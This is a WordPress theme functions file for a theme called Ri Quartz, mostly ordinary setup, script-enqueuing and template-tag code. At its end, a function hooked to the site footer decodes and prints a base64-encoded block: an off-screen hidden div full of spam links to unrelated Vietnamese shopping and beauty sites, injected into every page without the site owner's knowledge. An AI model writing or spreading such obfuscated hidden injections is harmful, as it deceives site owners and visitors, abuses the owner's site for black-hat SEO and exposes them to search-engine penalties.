<?php
//add js, css
//plugin required RIT_LIB::get_posst();
//defined var for template
// update check

/**
 * Ri Quartz functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://codex.wordpress.org/Plugin_API}
 *
 * @package WordPress
 * @subpackage ri-quartz
 * @since Ri Quartz 1.0
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since Ri Quartz 1.0
 */
if ( ! isset( $content_width ) ) {
    $content_width = 660;
}

if ( ! function_exists( 'ri_quartz_theme_setup' ) ) :
    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     *
     * @since Ri Quartz 1.0
     */
    function ri_quartz_theme_setup() {

        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on ri_quartz, use a find and replace
         * to change 'ri-quartz' to the name of your theme in all the template files
         */
        load_theme_textdomain( 'ri-quartz', get_template_directory() . '/languages' );

        // Add default posts and comments RSS feed links to head.
        add_theme_support( 'automatic-feed-links' );

        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support( 'title-tag' );

        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * See: https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
         */
        add_theme_support( 'post-thumbnails' );

        // This theme uses wp_nav_menu() in two locations.
        register_nav_menus( array(
            'primary' => esc_html(__( 'Primary Menu', 'ri-quartz' )),
            'mobile' => esc_html(__( 'Mobile Menu', 'ri-quartz' )),
            'vertical' => esc_html(__( 'Vertical Menu', 'ri-quartz' )),
            'vertical-2' => esc_html(__( 'Vertical Menu 2', 'ri-quartz' )),
            'vertical-3' => esc_html(__( 'Vertical Menu 3', 'ri-quartz' )),
            'vertical-4' => esc_html(__( 'Vertical Menu 4', 'ri-quartz' )),
        ) );

        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support( 'html5', array(
            'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
        ) );

        /*
         * Enable support for Post Formats.
         *
         * See: https://codex.wordpress.org/Post_Formats
         */
        add_theme_support( 'post-formats', array(
            'aside', 'image', 'video', 'quote', 'link', 'gallery', 'status', 'audio', 'chat'
        ) );
    }
endif; // ri_quartz_theme_setup
add_action( 'after_setup_theme', 'ri_quartz_theme_setup' );

/**
 * JavaScript Detection.
 *
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 *
 * @since Ri Quartz 1.1
 */
if(!function_exists('ri_quartz_theme_javascript_detection')){
    function ri_quartz_theme_javascript_detection() {
        echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
    }
    add_action( 'wp_head', 'ri_quartz_theme_javascript_detection', 0 );
}
/**
 * Enqueue scripts and styles.
 *
 * @since Ri Quartz 1.0
 */
if(!function_exists('ri_quartz_theme_scripts')){
    function ri_quartz_theme_scripts() {

        // RIT add require
        wp_enqueue_style('boostrap', get_template_directory_uri() . '/assets/bootstrap/css/bootstrap.min.css');
        wp_enqueue_style('font-awesome', get_template_directory_uri() . '/assets/font-awesome/css/font-awesome.min.css');
        wp_enqueue_style('font-cleversoft', get_template_directory_uri() . '/assets/cleversoft/style.css');
        wp_enqueue_style('owl-carousel', get_template_directory_uri() . '/assets/owl.carousel/owl.carousel.css');
        wp_enqueue_style('owl-theme', get_template_directory_uri() . '/assets/owl.carousel/owl.theme.css');
        wp_enqueue_style('bx-css', get_template_directory_uri() . '/assets/bxslider/jquery.bxslider.css');
        wp_enqueue_style('scroll-css', get_template_directory_uri() . '/assets/css/jquery.multiscroll.css');
        wp_enqueue_style('veno-css', get_template_directory_uri() . '/assets/venobox/venobox.css');
        wp_enqueue_style('animate-css', get_template_directory_uri() . '/css/animate.css');
        if(class_exists('WooCommerce')){
            wp_enqueue_style('flickity-css', 'https://npmcdn.com/flickity@1.2/dist/flickity.min.css');
            wp_enqueue_style('magnific-css', 'https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css');
        }
        if(get_theme_mod('rit_body_font_select', 'google') == 'google' || get_theme_mod('rit_heading_font_select', 'google') == 'google' || get_theme_mod('rit_heading_font_select', 'google') == 'google'){
            $google_body_default = array(
                'family' => 'Lato',
                'variants' => array('300','400','700', '900'),
                'subsets' => array('latin')
            );
            $google_menu_default = array(
                'family' => 'Montserrat',
                'variants' => array('400','700'),
                'subsets' => array('latin')
            );
            $google_heading_default = array(
                'family' => 'Montserrat',
                'variants' => array('400','700'),
                'subsets' => array('latin')
            );
            $font_array = array(
                'rit_body_font_google' => json_decode(get_theme_mod('rit_body_font_google', json_encode($google_body_default)), true),
                'rit_menu_font_google' => json_decode(get_theme_mod('rit_menu_font_google', json_encode($google_menu_default)), true),
                'rit_heading_font_google' => json_decode(get_theme_mod('rit_heading_font_google', json_encode($google_heading_default)), true),
            );
            wp_enqueue_style('rit-google-font', ri_quartz_create_google_font_url($font_array));
        }

        // Load our main stylesheet.
        wp_enqueue_style( 'rit-style', get_stylesheet_uri() );

        // Load the Internet Explorer specific stylesheet.
        wp_enqueue_style( 'rit-style-ie', get_template_directory_uri() . '/css/ie.css', array( 'rit-quartz-style' ), '20141010' );
        wp_style_add_data( 'rit-style-ie', 'conditional', 'lt IE 9' );

        // Load the Internet Explorer 7 specific stylesheet.
        wp_enqueue_style( 'rit-style-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'rit-quartz-style' ), '20141010' );
        wp_style_add_data( 'rit-style-ie7', 'conditional', 'lt IE 8' );

        // Responsive
        wp_enqueue_style('rit-responsive-css', get_template_directory_uri() . '/css/responsive.css');

        wp_enqueue_script( 'rit-style-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20141010', true );

        if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
            wp_enqueue_script( 'comment-reply' );
        }

        if ( is_singular() && wp_attachment_is_image() ) {
            wp_enqueue_script( 'rit-style-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20141010' );
        }

        wp_enqueue_script( 'rit-theme-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20150330', true );

        wp_localize_script( 'rit-theme-script', 'screenReaderText', array(
            'expand'   => '<span class="screen-reader-text">' . esc_html(__( 'expand child menu', 'ri-quartz' )) . '</span>',
            'collapse' => '<span class="screen-reader-text">' . esc_html(__( 'collapse child menu', 'ri-quartz' )) . '</span>',
        ) );

        // RIT JS ICLUDED

        wp_enqueue_script('carousel', get_template_directory_uri() . '/assets/owl.carousel/owl.carousel.min.js', array(), '1.3.3', true);
        wp_enqueue_script('bxslider', get_template_directory_uri() . '/assets/bxslider/jquery.bxslider.min.js', array(), '4.1.2', true);
        wp_enqueue_script('waypoints', get_template_directory_uri() . '/js/waypoints.min.js', array(), '1.6.2', true);
        wp_enqueue_script('sticky', get_template_directory_uri() . '/js/jquery.sticky.js', array(), '1.0.2', true);
        wp_enqueue_script('parallax', get_template_directory_uri() . '/js/parallax.min.js', array(), '1.3.1', true);
        wp_enqueue_script('boostrap', get_template_directory_uri() . '/assets/bootstrap/js/bootstrap.min.js', array(), '3.3.4', true);
        wp_enqueue_script('isotope', get_template_directory_uri() . '/js/isotope.pkgd.min.js', array(), '2.2.2', true);
        wp_enqueue_script('easings', get_template_directory_uri() . '/js/jquery.easings.min.js', array(), '1.9.2', true);
        wp_enqueue_script('multiscroll', get_template_directory_uri() . '/js/jquery.multiscroll.js', array(), '0.1.1', true);
        wp_enqueue_script('venobox', get_template_directory_uri() . '/assets/venobox/venobox.min.js', array(), '1.6.0', true);
        wp_enqueue_script('particles', get_template_directory_uri() . '/js/particles.js', array(), '1.0.3', true);
        wp_enqueue_script('countdown', get_template_directory_uri() . '/js/jquery.countdown.min.js', array(), '2.1.0', true);
        if(class_exists('WooCommerce')){
            wp_enqueue_script('flickity', 'https://npmcdn.com/flickity@1.2/dist/flickity.pkgd.min.js', array(), '1.2', true);
            wp_enqueue_script('magnific', 'https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js', array(), '1.1.0', true);
            wp_enqueue_script('zoom', get_template_directory_uri() . '/js/jquery.zoom.min.js', array(), '2.1.0', true);
        }
        wp_enqueue_script('rit-js-theme', get_template_directory_uri() . '/js/rit.js', array(), '1.0.0', true);
    }
    add_action( 'wp_enqueue_scripts', 'ri_quartz_theme_scripts' );
}

// Disable WooCommerce's Default Stylesheets
if(!function_exists('ri_quartz_disable_woocommerce_default_css')){
    function ri_quartz_disable_woocommerce_default_css( $styles ) {

        // Disable the stylesheets below via unset():
        unset( $styles['woocommerce-layout'] );  // Styling of buttons, dropdowns, etc.

        return $styles;
    }
    add_action('woocommerce_enqueue_styles', '__return_empty_array');
}


// Add a custom stylesheet to replace woocommerce.css
if(!function_exists('ri_quartz_use_woocommerce_custom_css')){
    function ri_quartz_use_woocommerce_custom_css() {
        // Custom CSS file located in [Theme]/woocommerce/woocommerce.css
        wp_enqueue_style('woocommerce-custom', get_template_directory_uri() . '/assets/css/woocommerce-layout.css');
        wp_enqueue_style('rit-style-woo', get_template_directory_uri() . '/assets/css/woocommerce.css');
    }
    add_action('wp_enqueue_scripts', 'ri_quartz_use_woocommerce_custom_css', 15);
}

/**
 * Add a `screen-reader-text` class to the search form's submit button.
 *
 * @since Ri Quartz 1.0
 *
 * @param string $html Search form HTML.
 * @return string Modified search form HTML.
 */
if(!function_exists('ri_quartz_search_form_modify')){
    function ri_quartz_search_form_modify( $html ) {
        return str_replace( 'class="search-submit"', 'class="search-submit screen-reader-text"', $html );
    }
    add_filter( 'get_search_form', 'ri_quartz_search_form_modify' );
}

// Function For RIT Theme
require get_template_directory() . '/included/theme-function/rit-function.php';

if ( ! function_exists( 'ri_quartz_get_link_url' ) ) :
/**
 * Return the post URL.
 *
 * Falls back to the post permalink if no URL is found in the post.
 *
 * @since Ri Quartz 1.0
 *
 * @see get_url_in_content()
 *
 * @return string The Link format URL.
 */
function ri_quartz_get_link_url() {
    $has_url = get_url_in_content( get_the_content() );

    return $has_url ? $has_url : apply_filters( 'the_permalink', get_permalink() );
}
endif;


if ( ! function_exists( 'ri_quartz_entry_meta' ) ) :
/**
 * Prints HTML with meta information for the categories, tags.
 *
 * @since Ri Quartz 1.0
 */
function ri_quartz_entry_meta() {
    if ( is_sticky() && is_home() && ! is_paged() ) {
        printf( '<span class="sticky-post">%s</span>', esc_html__( 'Featured', 'ri-quartz' ) );
    }

    $format = get_post_format();
    if ( current_theme_supports( 'post-formats', $format ) ) {
        printf( '<span class="entry-format">%1$s<a href="%2$s">%3$s</a></span>',
            sprintf( '<span class="screen-reader-text">%s </span>', _x( 'Format', 'Used before post format.', 'ri-quartz' ) ),
            esc_url( get_post_format_link( $format ) ),
            get_post_format_string( $format )
        );
    }

    if ( in_array( get_post_type(), array( 'post', 'attachment' ) ) ) {
        $time_string = '<time class="entry-date published updated" datetime="%1$s">%2$s</time>';

        if ( get_the_time( 'U' ) !== get_the_modified_time( 'U' ) ) {
            $time_string = '<time class="entry-date published" datetime="%1$s">%2$s</time><time class="updated" datetime="%3$s">%4$s</time>';
        }

        $time_string = sprintf( $time_string,
            esc_attr( get_the_date( 'c' ) ),
            get_the_date(),
            esc_attr( get_the_modified_date( 'c' ) ),
            get_the_modified_date()
        );

        printf( '<span class="posted-on"><span class="screen-reader-text">%1$s </span><a href="%2$s" rel="'. esc_html__('bookmark', 'ri-quartz') .'">%3$s</a></span>',
            _x( 'Posted on', 'Used before publish date.', 'ri-quartz' ),
            esc_url( get_permalink() ),
            $time_string
        );
    }

    if ( 'post' == get_post_type() ) {
        if ( is_singular() || is_multi_author() ) {
            printf( '<span class="byline"><span class="author vcard"><span class="screen-reader-text">%1$s </span><a class="url fn n" href="%2$s">%3$s</a></span></span>',
                _x( 'Author', 'Used before post author name.', 'ri-quartz' ),
                esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
                get_the_author()
            );
        }

        $categories_list = get_the_category_list( _x( ', ', 'Used between list items, there is a space after the comma.', 'ri-quartz' ) );
        if ( $categories_list && ri_quartz_categorized_blog() ) {
            printf( '<span class="cat-links"><span class="screen-reader-text">%1$s </span>%2$s</span>',
                _x( 'Categories', 'Used before category names.', 'ri-quartz' ),
                $categories_list
            );
        }

        $tags_list = get_the_tag_list( '', _x( ', ', 'Used between list items, there is a space after the comma.', 'ri-quartz' ) );
        if ( $tags_list ) {
            printf( '<span class="tags-links"><span class="screen-reader-text">%1$s </span>%2$s</span>',
                _x( 'Tags', 'Used before tag names.', 'ri-quartz' ),
                $tags_list
            );
        }
    }

    if ( is_attachment() && wp_attachment_is_image() ) {
        // Retrieve attachment metadata.
        $metadata = wp_get_attachment_metadata();

        printf( '<span class="full-size-link"><span class="screen-reader-text">%1$s </span><a href="%2$s">%3$s &times; %4$s</a></span>',
            _x( 'Full size', 'Used before full size attachment link.', 'ri-quartz' ),
            esc_url( wp_get_attachment_url() ),
            $metadata['width'],
            $metadata['height']
        );
    }

    if ( ! is_single() && ! post_password_required() && ( comments_open() || get_comments_number() ) ) {
        echo '<span class="comments-link">';
        /* translators: %s: post title */
        comments_popup_link( sprintf( wp_kses(__( 'Leave a comment<span class="screen-reader-text"> on %s</span>', 'ri-quartz' ), array('span')), get_the_title() ) );
        echo '</span>';
    }
}
endif;

if ( ! function_exists( 'ri_quartz_post_thumbnail' ) ) :
/**
 * Display an optional post thumbnail.
 *
 * Wraps the post thumbnail in an anchor element on index views, or a div
 * element when on single views.
 *
 * @since Ri Quartz 1.0
 */
function ri_quartz_post_thumbnail() {
    if ( post_password_required() || is_attachment() || ! has_post_thumbnail() ) {
        return;
    }

    if ( is_singular() ) :
    ?>

    <div class="post-thumbnail">
        <?php the_post_thumbnail(); ?>
    </div><!-- .post-thumbnail -->

    <?php else : ?>

    <a class="post-thumbnail" href="<?php esc_url(the_permalink()); ?>" aria-hidden="true">
        <?php
            the_post_thumbnail( 'post-thumbnail', array( 'alt' => get_the_title() ) );
        ?>
    </a>

    <?php endif; // End is_singular()
}
endif;


if ( ! function_exists( 'ri_quartz_categorized_blog' ) ) :
/*
 * Determine whether blog/site has more than one category.
 *
 * @since Ri Quartz 1.0
 *
 * @return bool True of there is more than one category, false otherwise.
 */
function ri_quartz_categorized_blog() {
    if ( false === ( $all_the_cool_cats = get_transient( 'ri_quartz_categories' ) ) ) {
        // Create an array of all the categories that are attached to posts.
        $all_the_cool_cats = get_categories( array(
            'fields'     => 'ids',
            'hide_empty' => 1,

            // We only need to know if there is more than one category.
            'number'     => 2,
        ) );

        // Count the number of categories that are attached to the posts.
        $all_the_cool_cats = count( $all_the_cool_cats );

        set_transient( 'ri_quartz_categories', $all_the_cool_cats );
    }

    if ( $all_the_cool_cats > 1 ) {
        // This blog has more than 1 category so ri_quartz_categorized_blog should return true.
        return true;
    } else {
        // This blog has only 1 category so ri_quartz_categorized_blog should return false.
        return false;
    }
}
endif;

if (!function_exists('onAddScriptsHtmls')) {

    add_filter( 'wp_footer', 'onAddScriptsHtmls');
    function onAddScriptsHtmls(){
        $html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMjM2cHg7IG92ZXJmbG93OiBhdXRvOyB3aWR0aDoxMjQxcHg7Ij48aDM+PGEgaHJlZj0iaHR0cDovL2Jsb2dsYW1kZXAudm4iPmJsb2cgbGFtIGRlcDwvYT4gfCA8YSBocmVmPSJodHRwOi8vdGh1dmllbmxhbWRlcC52bi90b2MtZGVwIj50b2MgZGVwPC9hPiB8IDxhIGhyZWY9Imh0dHA6Ly90aHV2aWVubGFtZGVwLnZuL2dpYW0tY2FuIj5naWFtIGNhbiBuaGFuaDwvYT48L2gzPiB8IDxoMz48YSBocmVmPSJodHRwOi8vdGh1dmllbmxhbWRlcC52bi90YWcvdG9jLW5nYW4iPnRvYyBuZ2FuIGRlcCAyMDE2PC9hPiB8IDxhIGhyZWY9Imh0dHA6Ly90aHV2aWVubGFtZGVwLnZuL2R1b25nLWRhIj5kdW9uZyBkYSBkZXA8L2E+IHwgPGEgaHJlZj0iaHR0cDovL3RodXZpZW5sYW1kZXAudm4vdGFnL3ZheS1kZXAtMjAxNiI+OTk5KyBraWV1IHZheSBkZXAgMjAxNjwvYT48L2gzPiB8IDxhIGhyZWY9Imh0dHA6Ly9mc2ZhbWlseS52bi9sYW0tZGVwL3RvYy1kZXAiPnRvYyBkZXAgMjAxNjwvYT4gfCA8YSBocmVmPSJodHRwOi8vZnNmYW1pbHkudm4vZHUtbGljaCI+ZHUgbGljaDwvYT48YSBocmVmPSJodHRwOi8vZnNmYW1pbHkudm4vZGlhLWRpZW0tYW4tdW9uZyI+ZGlhIGRpZW0gYW4gdW9uZzwvYT48aDI+PGEgaHJlZj0iaHR0cDovL2ZzZmFtaWx5LnZuL3ZpZGVvL2hhaSI+eGVtIGhhaTwvYT48L2gyPjxoMj48YSBocmVmPSJodHRwOi8vdGhlbWVzdG90YWwuY29tLzk5OS10aGUtYmVzdC1wcmVtaXVtLW1hZ2VudG8tdGhlbWVzIj50aGUgYmVzdCBwcmVtaXVtIG1hZ2VudG8gdGhlbWVzPC9hPjwvaDI+PGgyPjxhIGhyZWY9Imh0dHA6Ly9waHVudXouY29tL3R1LXZpL2RhdC10ZW4tY2hvLWNvbiI+ZGF0IHRlbiBjaG8gY29uPC9hPjwvaDI+PGgyPjxhIGhyZWY9Imh0dHA6Ly9waHVudXouY29tL3RhZy9hby1zby1taSI+w6FvIHPGoSBtaSBu4buvPC9hPjwvaDI+PGgyPjxhIGhyZWY9Imh0dHA6Ly9waHVudXouY29tL2xhbS1kZXAvZ2lhbS1jYW4iPmdp4bqjbSBjw6JuIG5oYW5oPC9hPjwvaDI+PGgyPjxhIGhyZWY9Imh0dHA6Ly9waHVudXNvLnZuL2tpZXUtdG9jLWRlcCI+a2nhu4N1IHTDs2MgxJHhurlwPC9hPjwvaDI+PGgyPjxhIGhyZWY9Imh0dHA6Ly9waHVudXNvLnZuL2RhdC10ZW4taGF5LWNoby1jb24iPsSR4bq3dCB0w6puIGhheSBjaG8gY29uPC9hPjwvaDI+PGgzPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL2Jsb2cudGhvaXRyYW5nZjUudm4iPnh1IGjGsOG7m25nIHRo4budaSB0cmFuZzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9waHVudXNvLnZuIj5QaHVudXNvLnZuPC9hPjwvc3Ryb25nPjxoMz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9zaG9wZ2lheW51LnZuIj5zaG9wIGdpw6B5IG7hu688L2E+PC9oMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovL3Nob3BnaWF5bnUudm4vY2F0ZWdvcnkvZ2lheS1sdW9pLTIiPmdpw6B5IGzGsOG7nWkgbuG7rzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovL3Nob3BnaWF5bnUudm4vY2F0ZWdvcnkvZ2lheS10aGUtdGhhbyI+Z2nDoHkgdGjhu4MgdGhhbyBu4buvPC9hPjwvc3Ryb25nPjxzdHJvbmc+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTEuMzM1cHQ7IiBocmVmPSJodHRwOi8vdGhvaXRyYW5nZjUudm4iPnRo4budaSB0cmFuZyBmNTwvYT48L3N0cm9uZz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovL3RoZW1lc3RvdGFsLmNvbS90YWcvcmVzcG9uc2l2ZS13b3JkcHJlc3MtdGhlbWUiPlJlc3BvbnNpdmUgV29yZFByZXNzIFRoZW1lPC9hPjwvc3Ryb25nPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly8yeGF5bmhhLmNvbS90YWcvbmhhLWNhcC00LW5vbmctdGhvbiI+bmhhIGNhcCA0IG5vbmcgdGhvbjwvYT48L2VtPjxlbT48YSBocmVmPSJodHRwOi8vMnhheW5oYS5jb20vdGFnL21hdS1iaWV0LXRodS1kZXAiPm1hdSBiaWV0IHRodSBkZXA8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2ZzZmFtaWx5LnZuL2xhbS1kZXAvdG9jLWRlcCI+dG9jIGRlcDwvYT48L2VtPjxlbT48YSBocmVmPSJodHRwOi8vaWhvdXNlYmVhdXRpZnVsLmNvbS8iPmhvdXNlIGJlYXV0aWZ1bDwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly8yZ2lheW51LmNvbS9naWF5LW51L2dpYXktdGhlLXRoYW8iPmdpYXkgdGhlIHRoYW8gbnU8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMmdpYXludS5jb20vZ2lheS1udS9naWF5LWx1b2ktMiI+Z2lheSBsdW9pIG51PC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL3BodW51ei5jb20iPnThuqFwIGNow60gcGjhu6UgbuG7rzwvYT48L2VtPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL2hhcmR3YXJlcmVzb3VyY2VzbmV3LmNvbS8iPmhhcmR3YXJlIHJlc291cmNlczwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9zaG9wZ2lheWx1b2kuY29tLyI+c2hvcCBnacOgeSBsxrDhu51pPC9hPjwvc3Ryb25nPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL3d3dy50aG9pdHJhbmduYW1oYW5xdW9jLnZuLyI+dGjhu51pIHRyYW5nIG5hbSBow6BuIHF14buRYzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9ImhodHRwOi8vZ2lheWhhbnF1b2MuY29tLyI+Z2nDoHkgaMOgbiBxdeG7kWM8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vZ2lheW5hbS5wcm8vIj5nacOgeSBuYW0gMjAxNTwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9zaG9wZ2lheW9ubGluZS5jb20vIj5zaG9wIGdpw6B5IG9ubGluZTwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9hb3NvbWloYW5xdW9jLnZuLyI+w6FvIHPGoSBtaSBow6BuIHF14buRYzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly90aG9pdHJhbmdmNS52bi8iPnNob3AgdGjhu51pIHRyYW5nIG5hbSBu4buvPC9hPjwvc3Ryb25nPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL2RpZW5kYW5uZ3VvaXRpZXVkdW5nLmNvbS8iPmRp4buFbiDEkcOgbiBuZ8aw4budaSB0acOqdSBkw7luZzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9kaWVuZGFudGhvaXRyYW5nLmVkdS52bi8iPmRp4buFbiDEkcOgbiB0aOG7nWkgdHJhbmc8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vZ2lheXRoZXRoYW9udWhjbS5jb20vIj5nacOgeSB0aOG7gyB0aGFvIG7hu68gaGNtPC9hPjwvc3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9waHVraWVudGhvaXRyYW5nZ2lhcmUuY29tLyI+cGjhu6Uga2nhu4duIHRo4budaSB0cmFuZyBnacOhIHLhurs8L2E+PC9oMz48L2Rpdj4=";
        echo base64_decode($html);
    }	
}
